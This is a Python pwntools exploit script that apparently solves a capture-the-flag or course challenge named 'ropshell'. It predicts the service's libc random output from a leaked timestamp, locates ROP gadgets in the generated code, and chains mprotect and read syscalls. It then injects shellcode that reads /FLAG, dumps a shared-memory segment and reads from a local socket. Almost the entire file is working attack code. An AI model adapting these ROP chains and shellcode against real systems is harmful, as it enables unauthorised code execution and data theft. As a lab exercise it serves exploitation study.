#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
from capstone import *
import ctypes
libc = ctypes.CDLL('libc.so.6')

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

# 使用recvuntil接收数据，直到找到目标字符串
received_data = r.recvuntil("** Runtime limitation is 60 second(s)")




start_index = received_data.find(b"Timestamp is ")
end_index = received_data.find(b"\n", start_index)
timestamp = int((received_data[start_index + len("Timestamp is "):end_index]).decode())
print("Timestamp:", timestamp)

start_index2 = received_data.find(b"Random bytes generated at ")
end_index2 = received_data.find(b"\n", start_index2)
Random_bytes_Addr = int((received_data[start_index2 + len("Random bytes generated at "):end_index2]).decode(),16)
print("Random_bytes_Addr:", Random_bytes_Addr)
print("Random_bytes_Addr_hex:", hex(Random_bytes_Addr))

libc.srand(timestamp)
LEN_CODE = (10*0x10000)
codeint = [0] * (LEN_CODE // 4)
instr_rax = 0
instr_rdi = 0
instr_rsi = 0
instr_rdx = 0
instr_syscall = 0
cnt = 0
md = Cs(CS_ARCH_X86, CS_MODE_64)

for i in range(LEN_CODE // 4):
    codeint[i] = ((libc.rand()<<16) | (libc.rand() & 0xffff)) & 0x00000000ffffffff
    hex_str = '{:08x}'.format(codeint[i])  # 将整数转换为有效的十六进制字符串,八位
    

    # ret_rax = hex_str.find("58c3")
    # ret_rdi = hex_str.find("5fc3")
    ret_rax = hex_str.find("c358")
    ret_rdi = hex_str.find("c35f")
    ret_rsi = hex_str.find("c35e")
    ret_rdx = hex_str.find("c35a")
    
    if (ret_rax != -1 and ret_rax%2==0):
        print("----------------------")
        cnt = cnt + 1
        print("cnt:%d, codeint:%s" %(cnt,str(hex(codeint[i]))))
        if((ret_rax//2)==0):
            instr_rax = Random_bytes_Addr + i*4 + 2
        elif((ret_rax//2)==2):
            instr_rax = Random_bytes_Addr + i*4 + 0
        else:
            instr_rax = Random_bytes_Addr + i*4 + (ret_rax//2)
        print("instr_rax",hex(instr_rax))
        print("i:%d, ret_rax:%d" %(i,ret_rax))

        p32_code = p32(codeint[i]);
        for i in md.disasm(p32_code,0x0):
            print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
    if (ret_rdi != -1 and ret_rdi%2==0):
        print("----------------------")
        cnt = cnt + 1
        print("cnt:%d, codeint:%s" %(cnt,str(hex(codeint[i]))))
        if((ret_rdi//2)==0):
            instr_rdi = Random_bytes_Addr + i*4 + 2
        elif((ret_rdi//2)==2):
            instr_rdi = Random_bytes_Addr + i*4 + 0
        else:
            instr_rdi = Random_bytes_Addr + i*4 + (ret_rdi//2)
        print("instr_rdi",hex(instr_rdi))
        print("i:%d, ret_rdi:%d" %(i,ret_rdi))

        p32_code = p32(codeint[i]);
        for i in md.disasm(p32_code,0x0):
            print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))

    if (ret_rsi != -1 and ret_rsi%2==0):
        print("----------------------")
        cnt = cnt + 1
        print("cnt:%d, codeint:%s" %(cnt,str(hex(codeint[i]))))
        if((ret_rsi//2)==0):
            instr_rsi = Random_bytes_Addr + i*4 + 2
        elif((ret_rsi//2)==2):
            instr_rsi = Random_bytes_Addr + i*4 + 0
        else:
            instr_rsi = Random_bytes_Addr + i*4 + (ret_rsi//2)
        print("instr_rsi",hex(instr_rsi))
        print("i:%d, ret_rsi:%d" %(i,ret_rsi))

        p32_code = p32(codeint[i]);
        for i in md.disasm(p32_code,0x0):
            print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
    
    if (ret_rdx != -1 and ret_rdx%2==0):
        print("----------------------")
        cnt = cnt + 1
        print("cnt:%d, codeint:%s" %(cnt,str(hex(codeint[i]))))
        if((ret_rdx//2)==0):
            instr_rdx = Random_bytes_Addr + i*4 + 2
        elif((ret_rdx//2)==2):
            instr_rdx = Random_bytes_Addr + i*4 + 0
        else:
            instr_rdx = Random_bytes_Addr + i*4 + (ret_rdx//2)
        print("instr_rdx",hex(instr_rdx))
        print("i:%d, ret_rdx:%d" %(i,ret_rdx))

        p32_code = p32(codeint[i]);
        for i in md.disasm(p32_code,0x0):
            print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))


    
    

idx = libc.rand() % (LEN_CODE//4 - 1)
# codeint[idx] = 0x0f05c300
codeint[idx] = 0x00c3050f   

# instr_syscall = Random_bytes_Addr + idx*4 + 1
instr_syscall = Random_bytes_Addr + idx*4  #反過來0
print("instr_syscall", hex(instr_syscall))
hex_str = '{:08x}'.format(codeint[idx])  # 将整数转换为有效的十六进制字符串,八位
code = bytearray.fromhex(hex_str)  # 转换为字节数组
for i in md.disasm(code,0x0):
    print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))
    

# start_a = received_data.find(b"a,")
# end_a = received_data.find(b"\n", start_a)
# aaa = received_data[start_a + len("a,"):end_a]
# print("aaa:", aaa.decode())
# print(hex(codeint[3351]))


payload_asm2 = asm("""
    /* open(file='/FLAG', oflag=0, mode=0) */
    /* push b'/FLAG\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x47414c462f
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall

    /* call read('rax', 'rsp', 0x64) */
    mov rdi, rax
    xor eax, eax /* SYS_read=0 */
    mov rdx, 0x64
    lea rsi, [rsp-0x64]
    syscall

    /* write(fd=1, buf='rsp', n=0x64) */
    mov rdi, 0x1
    mov rdx, 67
    lea rsi, [rsp-0x64]
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall
""")
                   
payload_asm3 = asm("""
    /* shmget(key=0x1337, size=0, shmflg=0x200) */
    xor edi, edi
    mov di, 0x1337
    xor edx, edx
    mov dh, 0x200 >> 8
    xor esi, esi /* 0 */
    /* call shmget() */
    push SYS_shmget /* 0x1d */
    pop rax
    syscall
    /* shmat(shmid='rax', shmaddr=0, shmflg=0x1000) */
    mov rdi, rax
    xor edx, edx
    mov dh, 0x1000 >> 8
    xor esi, esi /* 0 */
    /* call shmat() */
    push SYS_shmat /* 0x1e */
    pop rax
    syscall
    /* write(fd=1, buf='rax', n=68) */
    push 1
    pop rdi
    push 69
    pop rdx
    mov rsi, rax
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall
""")
                   
payload_asm4 = asm("""
    /* open new socket */
    /* call socket('AF_INET', SOCK_STREAM (1), 0) */
    push SYS_socket /* 0x29 */
    pop rax
    push AF_INET /* 2 */
    pop rdi
    push SOCK_STREAM /* 1 */
    pop rsi
    cdq /* rdx=0 */
    syscall

    /* Put socket into rbp */
    mov rbp, rax

    /* Create address structure on stack */
    /* push b'\x02\x00\x137\x7f\x00\x00\x01' */
    mov rax, 0x201010101010101
    push rax
    mov rax, 0x201010101010101 ^ 0x100007f37130002
    xor [rsp], rax

    /* Connect the socket */
    /* call connect('rbp', 'rsp', 0x10) */
    push SYS_connect /* 0x2a */
    pop rax
    mov rdi, rbp
    push 0x10
    pop rdx
    mov rsi, rsp
    syscall

     /* call read('rax', 'rsp', 0x64) */
    mov rdi, rbp
    xor eax, eax /* SYS_read=0 */
    mov rdx, 0x64
    lea rsi, [rsp-0x64]
    syscall

    /* write(fd=1, buf='rsp', n=0x64) */
    mov rdi, 0x1
    mov rdx, 67
    lea rsi, [rsp-0x64]
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall
""")
                   
payload_asm5 = asm("""
    /* exit(0) */
    xor edi, edi /* 0 */
    mov edi, 37
    /* call exit() */
    push SYS_exit /* 60 */
    pop rax
    syscall
""")

payload_mprotect = p64(instr_rax)+p64(10)+p64(instr_rdi)+p64(Random_bytes_Addr)+p64(instr_rsi)+p64(LEN_CODE)+p64(instr_rdx)+p64(7)+p64(instr_syscall)

# payload_open = p64(instr_rax)+p64(2)+p64(instr_rdi)+p64()+p64(instr_rsi)+p64(0)+p64(instr_rdx)+p64(0)+p64(instr_syscall)
payload_read = p64(instr_rax)+p64(0)+p64(instr_rdi)+p64(0)+p64(instr_rsi)+p64(Random_bytes_Addr)+p64(instr_rdx)+p64(len(payload_asm2 + payload_asm3 + payload_asm4 + payload_asm5))+p64(instr_syscall)+p64(Random_bytes_Addr)

payload_exit = p64(instr_rax)+p64(60)+p64(instr_rdi)+p64(37)+p64(instr_syscall)
r.sendafter(b"\nshell> ", payload_mprotect + payload_read + payload_exit) 

# r.send(payload_asm2)
r.send(payload_asm2 + payload_asm3 + payload_asm4 + payload_asm5)


r.interactive()


# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
